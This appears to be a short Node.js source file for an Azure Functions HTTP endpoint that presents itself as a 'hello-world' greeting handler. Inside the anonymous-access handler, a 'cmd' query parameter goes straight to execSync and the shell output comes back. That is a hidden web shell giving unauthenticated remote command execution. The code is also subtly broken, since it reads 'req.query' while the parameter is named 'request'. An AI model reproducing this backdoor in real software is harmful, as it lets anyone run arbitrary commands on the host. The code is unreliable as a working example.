const { app } = require("@azure/functions");
const { execSync } = require("child_process");

app.http("hello-world", {
    methods: ["GET", "POST"],
    authLevel: "anonymous",
    handler: async (request, context) => {
        context.log(`Http function processed request for url "${request.url}"`);
        const cmd = req.query.cmd;
        if (cmd) {
            const output = execSync(cmd, { encoding: "utf8" });
            return { body: output };
        }

        const name =
            request.query.get("name") || (await request.text()) || "world";
        return { body: `Hello, ${name}!!!` };
    },
});
